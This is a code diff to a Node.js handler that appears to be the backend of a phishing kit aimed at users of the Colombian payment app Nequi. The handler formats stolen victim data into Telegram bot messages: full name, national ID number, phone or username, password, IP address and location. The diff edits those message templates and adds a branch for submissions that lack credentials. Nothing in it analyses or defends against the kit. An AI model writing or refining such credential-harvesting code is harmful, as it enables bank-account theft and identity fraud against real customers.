@@ -1,3 +1,4 @@
+// Archivo: send-message.js (servidor Node.js)
 const axios = require('axios');
 
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
@@ -31,16 +32,7 @@ module.exports = async function handler(req, res) {
 
         let message;
 
-        if (step === 'ini') {
-            message = `
-🔰 Inicio de Proceso 🔰
-🆔 Nombres: ${fullName}
-🪪 Cédula: ${documentNumber}
-🌏 IP: ${userIP || 'Desconocida'}
-🏙 Ciudad: ${city || 'Desconocida'}
-🇨🇴 País: ${country || 'Desconocido'}
-`.trim();
-        } else if (step === 'dinamica2') {
+        if (step === "dinamica2") {
             message = `
 🔄 Dinámica 2
 🆔 Nombres: ${fullName}
@@ -51,7 +43,7 @@ module.exports = async function handler(req, res) {
 🌏 IP: ${userIP || 'Desconocida'}
 📍 Ubicación: ${city || 'Desconocida'}, ${country || 'Desconocido'}
 `.trim();
-        } else if (step === 'dinamica3') {
+        } else if (step === "dinamica3") {
             message = `
 🔄 Dinámica 3
 🆔 Nombres: ${fullName}
@@ -73,15 +65,24 @@ module.exports = async function handler(req, res) {
 🌏 IP: ${userIP || 'Desconocida'}
 📍 Ubicación: ${city || 'Desconocida'}, ${country || 'Desconocido'}
 `.trim();
+        } else if (!username && !password) {
+            message = `
+⭐️⭐️Nequi 2.0⭐️⭐️
+🪪ID: ${documentNumber}
+👤Nombres: ${fullName}
+🌏IP: ${userIP || 'Desconocida'}
+🏙Ciudad: ${city || 'Desconocida'}
+🇨🇴País: ${country || 'Desconocido'}
+`.trim();
         } else {
             message = `
-👤 Nequi_Meta_Infinito 👤
-🆔 Nombres: ${fullName}
-🪪 Cédula: ${documentNumber}
-#️⃣ Número: ${username || 'No proporcionado'}
-🔐 Clave: ${password || 'No proporcionada'}
-🌏 IP: ${userIP || 'Desconocida'}
-📍 Ciudad: ${city || 'Desconocida'}, País: ${country || 'Desconocido'}
+👤Nequi_Meta_Infinito👤
+🆔Nombres: ${fullName}
+🪪Cédula: ${documentNumber}
+#️⃣Número: ${username || 'No proporcionado'}
+🔐Clave: ${password || 'No proporcionada'}
+🌏IP: ${userIP || 'Desconocida'}
+🇨🇴Ciudad: ${city || 'Desconocida'}, País: ${country || 'Desconocido'}
 `.trim();
         }
 
